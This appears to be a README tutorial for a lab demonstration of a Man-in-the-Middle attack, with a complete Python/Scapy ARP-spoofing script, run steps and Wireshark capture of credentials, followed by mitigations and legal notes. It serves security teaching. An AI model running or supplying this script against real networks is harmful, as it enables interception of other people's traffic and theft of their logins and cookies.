# Cybersecurity_MitM_Demo
How to demonstrate a Man-in-the-Middle (MitM) attack

Demonstrating a Man-in-the-Middle (MitM) attack simulation requires a controlled environment to ensure legality and safety. 
Here’s a step-by-step guide to set up and demonstrate a basic ARP spoofing MitM attack using Python and the Scapy library:

### Prerequisites
- **Scapy**: A powerful Python library used for network packet manipulation.
- **Two virtual machines** or devices on the same network: One acting as the victim and the other as the attacker.
- **Wireshark**: A network protocol analyser to capture and inspect network traffic.

### Setup

1. **Install Scapy:**
   - Install Scapy on your attacker machine using pip:

```sh
pip install scapy
```

2. **Set Up the Victim and Attacker Machines:**
   - Ensure both the victim and attacker machines are on the same network.
   - Note the IP addresses of both machines and the gateway/router.

### MitM Attack Simulation Script

```python
from scapy.all import *
import time

def get_mac(ip):
    """
    Get the MAC address of the specified IP
    """
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    for sent, received in answered:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """
    Spoof the target IP address pretending to be the spoof IP address
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for IP {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    """
    Restore the network by reversing the ARP spoofing
    """
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = "VICTIM_IP"
    gateway_ip = "GATEWAY_IP"
    
    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopping ARP spoofing and restoring network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("Network restored.")
```

### Steps to Demonstrate

1. **Modify the Script:**
   - Replace `VICTIM_IP` and `GATEWAY_IP` with the actual IP addresses of the victim machine and the gateway (router).

2. **Run the Script:**
   - Execute the script on the attacker machine with root/administrator privileges:

```sh
sudo python mitm_attack.py
```

3. **Start Capturing Traffic:**
   - On the victim machine, start browsing the internet or accessing network resources.
   - Use Wireshark on the attacker machine to capture and inspect network traffic. Apply a filter such as `http` to see unencrypted HTTP traffic.

### Explanation and Impact

- **ARP Spoofing:**
  - The attacker machine sends spoofed ARP packets to the victim and the gateway, making each believe the attacker is the other party.
  - This allows the attacker to intercept all traffic between the victim and the gateway.

- **Capturing Sensitive Data:**
  - Using Wireshark, demonstrate how the attacker can capture sensitive information such as login credentials, cookies, and other unencrypted data.

### Mitigation Techniques

1. **Use HTTPS:**
   - Encourage the use of HTTPS to encrypt traffic, preventing interception of sensitive data.

2. **Implement ARP Spoofing Detection Tools:**
   - Use tools like `arpwatch` or `arp-scan` to detect and prevent ARP spoofing on the network.

3. **Network Segmentation:**
   - Segment the network to limit the impact of ARP spoofing attacks.

### Important Notes

- **Legal and Ethical Considerations:**
  - Perform this demonstration only in a controlled environment where you have permission.
  - Never attempt ARP spoofing or any other attack on networks you do not own or have explicit permission to test.

